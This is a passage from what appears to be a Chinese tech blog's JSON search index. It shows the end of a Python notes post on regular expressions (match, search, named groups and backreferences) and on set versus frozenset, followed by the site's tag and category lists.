match：只找一个，且在开头 123456789101112131415['a', 'a', 'a']&lt;re.Match object; span=(0, 8), match='chensong'&gt;chensong&lt;re.Match object; span=(0, 8), match='chensong'&gt;chensong['1', '3', 'c', 'a', '3']陈松是一个sg12['12', '31', '23']&lt;callable_iterator object at 0x000001B021814488&gt;12['3', '3', '2', '4', '3', '2']Process finished with exit code 0 命名分组举例 命名分组匹配 1234567891011import reret = re.search(&quot;&lt;(?P&lt;tag_name&gt;\\w+)&gt;\\w+&lt;/(?P=tag_name)&gt;&quot;,&quot;&lt;h1&gt;hello&lt;/h1&gt;&quot;)print(ret.group('tag_name'))print(ret.group())ret = re.search(r&quot;&lt;(\\w+)&gt;\\w+&lt;/\\1&gt;&quot;,&quot;&lt;h1&gt;hello&lt;/h1&gt;&quot;)# 如果不给组起名字，也可以用\\序号来找到对应的组，表示要找的内容和前面的组内容一致# 获取的匹配结果可以直接用group(序号)拿到对应的值print(ret.group(1))print(ret.group()) 容器相关类set和frozensetset: 不记录元素的添加位置 元素不允许重复 frozenset: 是set的不可变版本","link":"/2021/08/01/python%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"技巧","slug":"技巧","link":"/tags/%E6%8A%80%E5%B7%A7/"},{"name":"转载","slug":"转载","link":"/tags/%E8%BD%AC%E8%BD%BD/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"FTP","slug":"FTP","link":"/tags/FTP/"},{"name":"ECS","slug":"ECS","link":"/tags/ECS/"},{"name":"深度学习","slug":"深度学习","link":"/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"前馈神经网络","slug":"前馈神经网络","link":"/tags/%E5%89%8D%E9%A6%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"网络安全","slug":"网络安全","link":"/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"入门","slug":"入门","link":"/tags/%E5%85%A5%E9%97%A8/"},{"name":"LaTeX","slug":"LaTeX","link":"/tags/LaTeX/"},{"name":"教程","slug":"教程","link":"/tags/%E6%95%99%E7%A8%8B/"},{"name":"数据库","slug":"数据库","link":"/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"MySQL","slug":"MySQL","link":"/tags/MySQL/"},{"name":"shell","slug":"shell","link":"/tags/shell/"},{"name":"CNN","slug":"CNN","link":"/tags/CNN/"},{"name":"数据挖掘","slug":"数据挖掘","link":"/tags/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/"},{"name":"python","slug":"python","link":"/tags/python/"}],"categories":[{"name":"转载","slug":"转载","link":"/categories/%E8%BD%AC%E8%BD%BD/"},{"name":"linux","slug":"转载/linux","link":"/categories/%E8%BD%AC%E8%BD%BD/linux/"},{"name":"云计算","slug":"云计算","link":"/categories/%E4%BA%91%E8%AE%A1%E7%AE%97/"},{"name":"智能科技","slug":"智能科技","link":"/categories/%E6%99%BA%E8%83%BD%E7%A7%91%E6%8A%80/"},{"name":"网络安全","slug":"网络安全","link":"/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"LaTeX","slug":"LaTeX","link":"/categories/LaTeX/"},{"name":"阿里云","slug":"云计算/阿里云","link":"/categories/%E4%BA%91%E8%AE%A1%E7%AE%97/%E9%98%BF%E9%87%8C%E4%BA%91/"},{"name":"DBA","slug":"DBA","link":"/categories/DBA/"},{"name":"编程语言","slug":"编程语言","link":"/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"数据开发","slug":"智能科技/数据开发","link":"/categories/%E6%99%BA%E8%83%BD%E7%A7%91%E6%8A%80/%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/"},{"name":"shell","slug":"编程语言/shell","link":"/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/shell/"},{"name":"python","slug":"编程语言/python","link":"/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/"}]}